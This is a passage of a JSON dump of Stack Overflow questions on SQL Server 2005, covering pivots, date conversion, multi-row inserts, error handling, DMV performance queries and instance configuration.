connect remotely via TCP/IP?</p>\n\n<p><strong>MORE NOTES</strong></p>\n\n<ul>\n<li>The service account for the SQL Server named instance is a user account in <code>Domain1</code></li>\n<li>SPN's have been added for the service account (including server name and alias names)</li>\n</ul>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Changing the SQL Service instance service account to be in <code>Domain2</code> seems to have resolved the issue. I'll investigate further and post back my findings!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":8698,"score":2,"question_id":5015279,"title":"How to get the Sum of all column values in the last row of a resultset?","body":"<p>I need to get the sum of all column values of a resultset in the last row. \nHere is my SQL query.</p>\n\n<pre><code>select Master_Code, SUM(Jan), SUM(Feb), SUM(Mar)\nfrom dbo.foobar\nWHERE Participating_City = 'foofoo'\nGROUP BY Master_Code ORDER BY Master_Code ASC\n</code></pre>\n\n<p>something like this:</p>\n\n<pre><code>    Master_Code Jan Feb Mar \n    1            4   5   6\n    2            5   5   5\n    Total        9  10  11\n</code></pre>\n"},{"tags":["sql-server-2005","csv","import"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":13971,"score":4,"question_id":2562763,"title":"Importing csv file to SQL Server Management Studio - No tables available","body":"<p>I am trying to import a csv file to insert data into an existing table on my database. I go through the wizard and when it comes to select source tables and views for the destination, there are none to choose from. It just thinks I am trying to create a new table.</p>\n\n<p>Any suggestions? Thanks!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":9207,"score":2,"question_id":1477539,"title":"How to unlock user account in SQL Server 2005 Management Studio?","body":"<p>One of user name tried login many times and failed. Sql server 2005 locked account automatically. How can I unlock user account in SQL Server 2005 Management Studio?</p>\n"},{"tags":["c#","sql-server-2005","ado.net","multiple-insert"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3015,"score":2,"question_id":2972974,"title":"How should I multiple insert multiple records?","body":"<p>I have a class named <code>Entry</code> declared like this:  </p>\n\n<pre><code>class Entry{\n    string Id {get;set;}\n    string Name {get;set;}\n}  \n</code></pre>\n\n<p>and then a method that will accept multiple such <code>Entry</code> objects for insertion into the database using ADO.NET:  </p>\n\n<pre><code>static void InsertEntries(IEnumerable&lt;Entry&gt; entries){\n    //build a SqlCommand object\n    using(SqlCommand cmd = new SqlCommand()){\n        ...\n        const string refcmdText = \"INSERT INTO Entries (id, name) VALUES (@id{0},@name{0});\";\n        int count = 0;\n        string query = string.Empty;\n        //build a large query\n        foreach(var entry in entries){\n            query += string.Format(refcmdText, count);\n            cmd.Parameters.AddWithValue(string.Format(\"@id{0}\",count), entry.Id);\n            cmd.Parameters.AddWithValue(string.Format(\"@name{0}\",count), entry.Name);\n            count++;\n        }\n        cmd.CommandText=query;\n        //and then execute the command\n        ...\n    }\n}  \n</code></pre>\n\n<p>And my question is this: should I keep using the above way of sending multiple insert statements (build a giant string of insert statements and their parameters and send it over the network), or should I keep an open connection and send a single insert statement for each <code>Entry</code> like this:  </p>\n\n<pre><code>using(SqlCommand cmd = new SqlCommand(){\n    using(SqlConnection conn = new SqlConnection(){\n        //assign connection string and open connection\n        ...\n        cmd.Connection = conn;\n        foreach(var entry in entries){\n            cmd.CommandText= \"INSERT INTO Entries (id, name) VALUES (@id,@name);\";\n            cmd.Parameters.AddWithValue(\"@id\", entry.Id);\n            cmd.Parameters.AddWithValue(\"@name\", entry.Name);\n            cmd.ExecuteNonQuery();\n        }\n    }\n }  \n</code></pre>\n\n<p>What do you think? Will there be a performance difference in the Sql Server between the two? Are there any other consequences I should be aware of?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":12536097,"title":"How to convert military hours to mm/dd/yyyy and time in SQL sever?","body":"<p>I have a simple data set shown in Table 1 below. I would like to produce two new columns (<code>START_SHIFT_DT_TIME</code> and <code>END_SHIFT_DT_TIME</code>) using the columns from Table 1. The desired output is shown in Table 2. </p>\n\n<p>The requirements are:</p>\n\n<ol>\n<li>If the <code>START_SHIFT</code> hours starts on or after 22:00:00 then the actual start date is the previous day.</li>\n<li>If the <code>START_SHIFT</code> hours starts before  22:00:00 then the actual start date is the following day.</li>\n</ol>\n\n<p>Could someone please take a look. Note, I am using SQL server. Thanks a lot!!!</p>\n\n<p><strong>Table 1</strong>:</p>\n\n<pre><code>START_SHIFT END_SHIFT       DATE    \n22:00:00    06:00:00        1/13/2012 12:00:00 AM\n07:00:00    15:00:00        1/13/2012 12:00:00 AM\n23:30:00    07:30:00        2/27/2012 12:00:00 AM\n00:00:00    08:00:00        2/17/2012 12:00:00 AM\n17:00:00    01:00:00        1/1/2012 12:00:00 AM\n</code></pre>\n\n<p><strong>Table 2</strong>:</p>\n\n<pre><code>START_SHIFT END_SHIFT     DATE                  START_SHIFT_DT_TIME     END_SHIFT_DT_TIME\n22:00:00    06:00:00      1/13/2012 12:00:00 AM  1/12/2012 10:00:00 PM  1/13/2012 6:00:00 AM\n07:00:00    15:00:00      1/13/2012 12:00:00 AM  1/13/2012 7:00:00 AM   1/13/2012 3:00:00 PM\n23:30:00    07:30:00      2/27/2012 12:00:00 AM  2/26/2012 11:30:00 PM  2/27/2012 7:30:00 AM\n00:00:00    08:00:00      2/17/2012 12:00:00 AM  2/17/2012 12:00:00 AM  2/17/2012 8:00:00 AM\n17:00:00    01:00:00      1/1/2012 12:00:00 AM   1/1/2012 5:00:00 PM    1/2/2012 1:00:00 AM\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","cakephp"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":780,"score":4,"question_id":2334918,"title":"CakePHP model useTable with SQL Views","body":"<p>I'm in the process converting our CakePHP-built website from Pervasive to SQL Server 2005.  After a lot of hassle the setup I've gotten to work is using the ADODB driver with 'connect' as odbc_mssql. This connects to our database and builds the SQL queries just fine.  </p>\n\n<p>However, here's the rub: one of our Models was associated with an SQL view in Pervasive.  I ported over the view, but it appears using the set up that I have that CakePHP can't find the View in SQL Server.</p>\n\n<p>Couldn't find much after some Google searches - has anyone else run into a problem like this?  Is there a solution/workaround, or is there some redesign in my future?</p>\n"},{"tags":["c#","sql","sql-server-2005","transactions","vsts2008"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":300,"score":2,"question_id":3084195,"title":"Can a transaction be rolled back after it's committed and connection is closed?","body":"<p>Can a transaction be rolled back after it's committed and connection is closed?</p>\n\n<pre><code>    finally\n    {\n        // Commit the transaction.\n        sqlTran.Commit();\n\n        reader.Close();\n        reader.Dispose();\n\n        conn.Close();\n        conn.Dispose();\n    }\n</code></pre>\n\n<p>I would like to give the user an option of <em>Opps! roll it back</em>. So if it's commited can it be rolled back?</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":2331904,"title":"Generate calendar ","body":"<p>How can I generate the dates for the entire range? \nThanks</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures","recovery","data-recovery"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":963,"score":1,"question_id":6739949,"title":"undo changes to a stored procedure","body":"<p>I altered a stored procedure and unknowingly overwrote some changes that were made to it by another developer. Is there a way to undo the changes and get the old script back?</p>\n\n<p>Unfortunately I do not have a backup of that database, so that option is ruled out. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot","unpivot"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12531522,"title":"Using Dynamic Pivot/Unpivot to display correctly","body":"<p>I believe I will have to use both a Pivot and a UnPivot to get the data that I want.</p>\n\n<p>My current data looks like this:</p>\n\n<pre><code>var_date    var_attribute   var_out_of_ad   var_per_ad\n9/4/2012    Aux1            0               0\n9/5/2012    Aux1            0               0\n9/4/2012    Aux2            1680            0.733333333\n9/5/2012    Aux2            1680            0.733333333\n9/4/2012    Aux3            1500            0.791666667\n9/5/2012    Aux3            1500            0.791666667\n9/4/2012    Aux4            0               0\n9/5/2012    Aux4            0               0\n9/4/2012    Aux5            0               0\n9/5/2012    Aux5            0               0\n9/4/2012    Aux6            26640           0.766929134\n9/5/2012    Aux6            26640           0.766929134\n9/4/2012    Aux7            28800           0\n9/5/2012    Aux7            28800           0\n9/4/2012    Aux8            3600            0\n9/5/2012    Aux8            3600            0\n</code></pre>\n\n<p>I want to be able to break apart by Aux Code (which will by dynamic) the columns <code>var_out_of_ad</code> and <code>var_per_ad</code> so I would like my data to look like this:</p>\n\n<pre><code>var_date  Aux1_per   Aux1_out   Aux2_per   Aux2_out ...\n9/4/2012  0          0           .733      1680\n9/5/2012  0          0           .733      1680\n</code></pre>\n\n<p>I have put the testing data into a sql fiddle: <a href=\"http://sqlfiddle.com/#!3/7f06d/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/7f06d/1</a> as well as all of the work I have done with the dynamic pivot.</p>\n\n<p>Can someone please guide me as to what to do next? I am lost.</p>\n\n<p>Thank You</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":113,"score":2,"question_id":12524537,"title":"Convert UTC Milliseconds to DATETIME in SQL server","body":"<p>I have an requirement to convert UTC milliseconds to DateTime in SQL server.</p>\n\n<p>This we can easily do it in the C# by following code.</p>\n\n<pre><code>DateTime startDate = new DateTime(1970, 1, 1).AddMilliseconds(1348203320000);\n</code></pre>\n\n<p>I need to do this in SQL server. I found some script here <a href=\"http://extendeddotnet.blogspot.in/2011/10/convert-net-datetimeticks-to-t-sql.html\" rel=\"nofollow\">http://extendeddotnet.blogspot.in/2011/10/convert-net-datetimeticks-to-t-sql.html</a>. But this was taking initial ticks are from 1900-01-01. </p>\n\n<p>I have used DATEADD function as below, but this was giving Arithmetic overflow exception by supping milliseconds as difference.</p>\n\n<pre><code>SELECT DATEADD(MILLISECOND,1348203320000,'1970-1-1')\n</code></pre>\n\n<p>Please Help me in this regard. Thanks in Advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12530317,"title":"Case Statement Set Parameter","body":"<pre><code>SELECT (CASE\n        WHEN(percentage &gt;= @Start AND percentage &lt; @End)                        \n        THEN \n            SET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;Report&lt;/H3&gt;\n                        &lt;table border = 1&gt; \n                        &lt;tr&gt;\n                        &lt;th&gt;No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; lag &lt;/th&gt; &lt;th&gt; Variance &lt;/th&gt;&lt;/tr&gt;'    \n            SET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;' \n        ELSE 'NULL' END) as Variance  \n    FROM TestTbl\n</code></pre>\n\n<p>Msg 156, Level 15, State 1, Procedure SP_CheckDB, Line 31\nIncorrect syntax near the keyword 'SET'.\nMsg 156, Level 15, State 1, Procedure SP_CheckDB, Line 36\nIncorrect syntax near the keyword 'ELSE'</p>\n\n<p>Kindly help with this statement</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":8,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":15801,"score":12,"question_id":8439,"title":"Conditional Visibility and Page Breaks with SQL Server 2005 Reporting Services","body":"<p>I know there's a bug with conditional visibility and page breaks with SQL 2005, but I wonder if anyone has come up with a work around.</p>\n\n<p>I have a table that has a conditional visibility expression, and I need a page break at the end of the table.</p>\n\n<ul>\n<li>If I set the PageBreakAtEnd property to true. It is ignored no matter what. Remove the visibility condition and it works.</li>\n<li>If I place the table inside a rectangle with the conditional visibility on the table, and the page break on the table. Same result. The page break property is ignored.</li>\n<li>If I set the rectangle with the PageBreakAtEnd property and the table with the visibility condition, then I still get a page break even when the table isn't shown.</li>\n</ul>\n\n<p>Any other ideas on what to try? I'm almost at the point where I need a separate report rather than conditional visibility :(</p>\n\n<p><strong>Edit: @Josh:</strong> That has the same problems. If the second table has conditional visibility it doesn't work. If it doesn't have the visibility expression, then I get the page break all the time.</p>\n\n<p>@<strong>Erick:</strong> I really wanted that to be the answer but unfortunately it doesn't work. When the visibility expression evaluates to hidden, there's a big gap where the rectangles would be (which I can live with), and when it evaluates to visible, the page breaks still don't work. </p>\n"},{"tags":["xml","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":979,"score":7,"question_id":3026748,"title":"Difference between SQL 2005 and SQL 2008 for inserting multiple rows with XML","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3978807/why-insert-select-to-variable-table-from-xml-variable-so-slow\">Why insert-select to variable table from XML variable so slow?</a>  </p>\n</blockquote>\n\n\n\n<p>I am using the following SQL code for inserting multiple rows of data in a table. The data is passed to the stored procedure using an XML variable :</p>\n\n<pre><code>INSERT INTO MyTable\n   SELECT SampleTime = T.Item.value('SampleTime[1]', 'datetime'),\n          Volume1 = T.Item.value('Volume1[1]', 'float'),\n          Volume2 = T.Item.value('Volume2[1]', 'float')\n   FROM @xml.nodes('//Root/MyRecord') T(item)\n</code></pre>\n\n<p>I have a whole bunch of unit tests to verify that I am inserting the right information, the right number of records, etc.. when I call the stored procedure. </p>\n\n<p>All fine and dandy - that is, until we began to monkey around with the compatibility level of the database.</p>\n\n<p>The code above worked beautifully as long as we kept the compatibility level of the DB at 90 (SQL 2005).\nWhen we set the compatibility level at 100 (SQL 2008), the unit tests failed, because the stored procedure using the code above times out.</p>\n\n<p>The unit tests are dropping the database, re-creating it from scripts, and running the tests on the brand new DB, so it's not - I think - a question of the 'old compatibility level' sticking around.</p>\n\n<p>Using the SQL Management studio, I made up a quick test SQL script. Using the same XML chunk, I alter the DB compat level , truncate the table, then use the code above to insert 650 rows. When the level is 90 (SQL 2005), it runs in milliseconds. When the level is 100 (SQL 2008) it sometimes takes over a minute, sometimes runs in milliseconds.</p>\n\n<p>I'd appreciate any insight anyone might have into that.</p>\n\n<hr>\n\n<h2>EDIT</h2>\n\n<p>The script takes over a minute to run with my actual data, which has more rows than I show here, is a real table, and has an index.\nWith the following example code, the difference goes between milliseconds and around 5 seconds.</p>\n\n<pre><code>--use [master]\n--ALTER DATABASE MyDB SET compatibility_level =100\n\nuse [MyDB]\n\ndeclare @xml xml\n\nset @xml = '&lt;?xml version=\"1.0\"?&gt;\n&lt;Root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;Record&gt;\n    &lt;SampleTime&gt;2009-01-24T00:00:00&lt;/SampleTime&gt;\n    &lt;Volume1&gt;0&lt;/Volume1&gt;\n    &lt;Volume2&gt;0&lt;/Volume2&gt;\n  &lt;/Record&gt;\n..... 653 records, sample time spaced out 4 hours ........\n&lt;/Root&gt;'\n\nDECLARE @myTable TABLE(\nID int IDENTITY(1,1) NOT NULL,\n    [SampleTime] [datetime] NOT NULL,\n    [Volume1] [float] NULL,\n    [Volume2] [float] NULL)\n\nINSERT INTO @myTable\n    select \n        T.Item.value('SampleTime[1]', 'datetime') as SampleTime,\n            Volume1 = T.Item.value('Volume1[1]', 'float'),\n            Volume2 = T.Item.value('Volume2[1]', 'float')\n    FROM @xml.nodes('//Root/Record') T(item)\n</code></pre>\n\n<p>I uncomment the 2 lines at the top, select them and run just that (the ALTER DATABASE statement), then comment the 2 lines, deselect any text and run the whole thing.</p>\n\n<p>When I change from 90 to 100, it runs all the time in 5 seconds (I change the level once, but I run the series several times to see if I have consistent results).\nWhen I change from 100 to 90, it runs in milliseconds all the time.\nJust so you can play with it too.\nI am using SQL Server 2008 R2 standard edition.</p>\n"},{"tags":["sql","tsql","sql-server-2005","try-catch","raiserror"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12485234,"title":"RAISERROR from Catch Block in TSQL Passed to Calling Batch - Need that Passed to Calling Application","body":"<p>I have been researching the TRY/CATCH block and I am a little stumped on how to pass an error the way I need to do so.  From what I have read and if I understand correctly, a RAISERROR in a CATCH block in SQL will be passed to the calling batch OR the calling application.  The application is running a stored procedure which has a transaction in it.  The transaction is wrapped in a TRY/CATCH block.  In the CATCH block, I am raising the error if something in the transaction fails causing it to jump to CATCH. If running the procedure via SSMS, the error shows up fine and the transaction rolls back.  However, if the application calls the stored procedure and the same error occurs, the application never knows about the error and thus doesn't now the procedure failed.</p>\n\n<p>First of all, am I understanding correctly how the RAISERROR in CATCH works?  If so, how can I get that error raised back to the calling application?</p>\n\n<pre><code>BEGIN TRY \n    BEGIN TRAN \n        ............... \n    COMMIT \nEND TRY \nBEGIN CATCH \n    IF @@TRANCOUNT &gt; 0 \n        ROLLBACK \n    DECLARE @ErrMsg NVARCHAR(4000) \n    SELECT @ErrMsg = ERROR_MESSAGE() \n    RAISERROR(@ErrMsg, 16, 1) \nEND CATCH \n</code></pre>\n\n<p>I am Running Windows 7, SQL Server 2005</p>\n"},{"tags":["sql-server-2005","pivot"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2740,"score":1,"question_id":1047498,"title":"Rows to Columns using Sql Query","body":"<p>hi i have a table with columns as</p>\n\n<pre><code>              Cost     Rate\n\n              Repair   12\n              Repair   223\n              Wear     1000    \n              Wear     666\n              Fuel     500\n              Repair   600\n              Fuel     450\n              Wear     400\n</code></pre>\n\n<p>Now i want this data as</p>\n\n<pre><code>             Repair    Wear   Fuel\n               825     2066    950\n</code></pre>\n\n<p>Using Sql Query</p>\n\n<p>Thanks in advance      </p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":881,"score":2,"question_id":379962,"title":"How to pivot my data with SQL Server 2005","body":"<p>I have the following data</p>\n\n<p><img src=\"http://i41.tinypic.com/swr04y.jpg\" alt=\"alt text\" /></p>\n\n<p>How do I transform it (with SQL Server 2005) into the following format?</p>\n\n<p><img src=\"http://i41.tinypic.com/339u9tw.jpg\" alt=\"alt text\" /></p>\n\n<p>I have a example solution that I came up with but it seems a little clunky.  It smells perhaps?</p>\n\n<pre><code>DECLARE @ProductLanguage TABLE\n(\n    [PRODUCT_ID] int\n    , [LANGUAGE] varchar(50)\n)\n\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'Czech')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'English')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'German')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'Danish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'Spanish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'English')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Finnish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Greek')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Hungarian')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52044,'Hebrew')\n\nSELECT\n    PRODUCT_ID\n    ,MAX(CASE WHEN [ROW_ID]=1 THEN LANGUAGE ELSE NULL END) As LANG_1\n    ,MAX(CASE WHEN [ROW_ID]=2 THEN LANGUAGE ELSE NULL END) As LANG_2\n    ,MAX(CASE WHEN [ROW_ID]=3 THEN LANGUAGE ELSE NULL END) As LANG_3\nFROM\n    (SELECT\n        ROW_NUMBER() OVER (PARTITION BY [PRODUCT_ID] ORDER BY [PRODUCT_ID] ASC) AS [ROW_ID]\n        , [PRODUCT_ID]\n        , [LANGUAGE]\n    FROM\n        @ProductLanguage) AS Temp\nGROUP BY\n    [PRODUCT_ID]\n</code></pre>\n\n<p>The interesting bit is I do not care about the specific Languages displayed in each LANG_* column.  Other questions posted here seem to all refer to knowning the pivoted columns by name. But I do not want to name the columns by the languages found.</p>\n\n<p><strong>NOTE</strong>:\nI know I mention the word \"pivot\" but the best solution for this problem may not involve the PIVOT clause.  I just used that word as my question seemed to suggest pivotting data.\nMaybe a CTE would help with the solution, I do not know.  I just know I am not happy about the example solution above.</p>\n"},{"tags":["sql-server-2005","service"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12523282,"title":"Sql service could not be started","body":"<p>Please advise me on this issue:</p>\n\n<p>I have one default SQL instance in SQL Server 2005(sp 3 x64 bits) called instanceA\nThen I installed another 2 instances call instanceB and C.</p>\n\n<p>After that I restore master.bak from production server to this instanceB. The SQL services for  this instance could not be started at all since then. If I turned off the default instance services, instanceB can be started. This is because both of the instances are pointing to the same 'model.mdf' file in 'MSSQL.1' folder. Hence both instances could not be started simultaneously.</p>\n\n<p>I believe that in production server, the model path is configured to the default folder 'MSSQL.1' .Is there anyway to change the path to 'MSSQL.8' that belongs to instanceB upon installation so that both instances A and B could be started together?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":42,"score":1,"question_id":9309228,"title":"Filtering with foreign key","body":"<p>I have three tables <code>tblClients</code>, <code>tblClientsActivities</code> and <code>tblActivities</code></p>\n\n<p><code>tblClients</code> and <code>tblClientsActivities</code> are joined together to produce Table A below</p>\n\n<pre><code>SELECT * from tblClientsActivities \nleft join tblclients on tblClientsActivities.fk_cid=tblclients.pk_cid\n\nPK_AID      FK_CID     FK_AID\n1             4          1   \n2             4          2\n3             4          4\n4             5          1\n5             5          3\n6             5          5\n7             6          1\n8             6          2\n9             7          6\n10            8          3\n</code></pre>\n\n<p>The problem is how do i remove all clients where FK_AID &lt;> 1</p>\n"},{"tags":["sql-server-2005","index"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":56,"score":-2,"question_id":11530839,"title":"Why we should create noncluster index on foreign key table and cluster index in primary key table","body":"<p>Why we should create noncluster index on foreign key table and cluster index in primary key table.\ni have read many topic on index but i have never understand why we should create noncluster index on foreign key table and cluster index in primary key table.\nwhy one cluster index for a table and 249 for noncluster index.</p>\n"},{"tags":["sql-server-2005","database-performance","dmv"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12519763,"title":"CPU Time spent for each sql server session using DMVs?","body":"<p>Is there a way to get the CPU Time for each session or for every open connection in SQL Server 2005 using DMVs? I have kind of tried various combinations of  sys.dm_exec_query_stats, sys.dm_exec_connections, sys.dm_exec_sessions. Am i missing some other obvious way to get this same information? My environment is a SQL Server 2005 with about 100 databases where one database takes about 40% CPU (found using query below) and I am trying to figure out whats (number of connections, what queries, etc..) is taking it upto 40%.</p>\n\n<p>This script gives CPU time for each Database. I just need to break it down to Session OR at least at the Connection level.</p>\n\n<pre><code>WITH DB_CPU_Stats\nAS\n(SELECT DatabaseID, DB_Name(DatabaseID) AS [DatabaseName], \n  SUM(total_worker_time) AS [CPU_Time_Ms]\n FROM sys.dm_exec_query_stats AS qs\n CROSS APPLY (SELECT CONVERT(int, value) AS [DatabaseID] \n              FROM sys.dm_exec_plan_attributes(qs.plan_handle)\n              WHERE attribute = N'dbid') AS F_DB\n GROUP BY DatabaseID)\nSELECT ROW_NUMBER() OVER(ORDER BY [CPU_Time_Ms] DESC) AS [row_num],\n       DatabaseName, [CPU_Time_Ms], \n       CAST([CPU_Time_Ms] * 1.0 / SUM([CPU_Time_Ms]) \n       OVER() * 100.0 AS DECIMAL(5, 2)) AS [CPUPercent]\nFROM DB_CPU_Stats\nWHERE DatabaseID &gt; 4 -- system databases\nAND DatabaseID &lt;&gt; 32767 -- ResourceDB\nORDER BY row_num\n</code></pre>\n\n<p>Appreciate if you could provide a working sample. </p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>Modified the query above - Is this good enough? Just want someone to validate...</p>\n\n<pre><code>WITH DB_CPU_Stats\nAS\n(SELECT DatabaseID, DB_Name(DatabaseID) AS [DatabaseName], sql_handle,\n  SUM(total_worker_time) AS [CPU_Time_Ms]\n FROM sys.dm_exec_query_stats AS qs\n CROSS APPLY (SELECT CONVERT(int, value) AS [DatabaseID] \n              FROM sys.dm_exec_plan_attributes(qs.plan_handle)\n              WHERE attribute = N'dbid') AS F_DB\n GROUP BY DatabaseID, sql_handle\n)\n\n\nSELECT ROW_NUMBER() OVER(ORDER BY [CPU_Time_Ms] DESC) AS [row_num],\n       DatabaseName, [CPU_Time_Ms],  text, count(1) as Connections,\n       CAST([CPU_Time_Ms] * 1.0 / SUM([CPU_Time_Ms]) \n       OVER() * 100.0 AS DECIMAL(5, 2)) AS [CPUPercent]\nFROM DB_CPU_Stats\ncross apply sys.dm_exec_sql_text(sql_handle) C\njoin sys.dm_exec_connections CON on CON.most_recent_sql_handle = sql_handle\nWHERE DatabaseID &gt; 4 -- system databases\nAND DatabaseID &lt;&gt; 32767 -- ResourceDB\nGROUP BY CPU_Time_Ms, DatabaseName, text\nORDER BY row_num\n</code></pre>\n\n<p>Is the most_recent_handle of dm_exec_connections, supposed to map to sql_handle of dm_exec_query_text?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","where-clause"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":111,"score":3,"question_id":12509432,"title":"How to use WHERE clauses to optimise SQL query","body":"<p>I have a very simple query. </p>\n\n<pre><code>SELECT top 100 *\nFROM logs\nWHERE description LIKE '%5488826%'\nORDER BY id DESC\n</code></pre>\n\n<p>However it contains a LIKE clause which is searching a largish text field.</p>\n\n<p>I know the table only has (for example) 200200 rows </p>\n\n<p>(I'm only interested in finding something that happened in a row id > 200000).  </p>\n\n<p>I <em>tried</em> to optimise the query by adding in</p>\n\n<pre><code> SELECT top 100 *\n FROM logs\n WHERE  ID &gt; 200000 \n AND description LIKE '%5488826%'\n ORDER BY id DESC\n</code></pre>\n\n<p>my thinking was that SQL would run the <code>ID &gt; 200000</code> constraint first and that would help speed up the query, but it still takes minutes to run, what should I do to make this run faster. </p>\n\n<p>EDIT:\nID is PK and indexed</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12516151,"title":"joining scalar valued function to a table taking that column generated by SVF as in input","body":"<p>i have scalar valued function which is called and it gives a new column values  in the table, now I want to join this new column value  to a column of new table which I have added as derived table in sql server 2005.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12507472,"title":"Auto Increment in SQL server 2005","body":"<p>How to add auto incrementing property to primary key of a table in Sql Server 2005 ?\nI have ProductID as primary key. I want to increment its value by 1 everytime a record is added. I didn't use IDENTITY keyword while creating table.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12510050,"title":"How to get NT_Username using sql query when database is logged in under SQL Server authentication","body":"<p>I have logged in using SQL Server authentication, I want to retrieve the windows username using SQL query.</p>\n\n<p>I tried using SYSTEM_USER and SUSER_NAME() it returns the sql logged in username and not windows NT_Username.</p>\n\n<p>Is there any way to get windows NT_username ?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":105,"score":3,"question_id":12511447,"title":"SQL Server: datetime out of range error","body":"<p>I have this query</p>\n\n<pre><code>SELECT W.NUMBER,B.NAME,Br.NAME,W.WDATE,W.REPAIRSTATUS,W.REPAIRCOST,W.REMARK\nFROM Work_Order AS W,Brands AS B,Branches AS Br\nWHERE W.BRANDID = B.ID AND W.BRANCHID = Br.ID\nAND CAST(WDATE as DATETIME)  &lt; CAST('09/18/2012' AS DATETIME)\n</code></pre>\n\n<p>and the system respond with </p>\n\n<blockquote>\n  <p><em>The conversion of a char data type to a datetime data type resulted in\n  an out-of-range datetime value.</em></p>\n</blockquote>\n\n<p>also using this query it gives the same error</p>\n\n<pre><code>SELECT W.NUMBER,B.NAME,Br.NAME,W.WDATE,W.REPAIRSTATUS,W.REPAIRCOST,W.REMARK\nFROM Work_Order AS W,Brands AS B,Branches AS Br\nWHERE W.BRANDID = B.ID AND W.BRANCHID = Br.ID\nORDER BY CAST(W.WDATE AS DATETIME)\n</code></pre>\n\n<p>WDATE is like '09/03/2012' and it is an input from jquery ui datepicker with mm/dd/yyyy date format</p>\n\n<p>Please help me I don't know how to fix it.</p>\n\n<p>I am working on SQL Server 2005.</p>\n\n<p>EDIT: I tried the same queries with another sql server 2005 and it's working fine so please how to fix this error with a sql server settings ??</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12094728,"title":"Write a SQL Log procedure","body":"<p>I need to write a simple SQL log procedure, that could be called like this:</p>\n\n<pre><code>Log(\"This is my param1 = {0}, param2 = {1} and 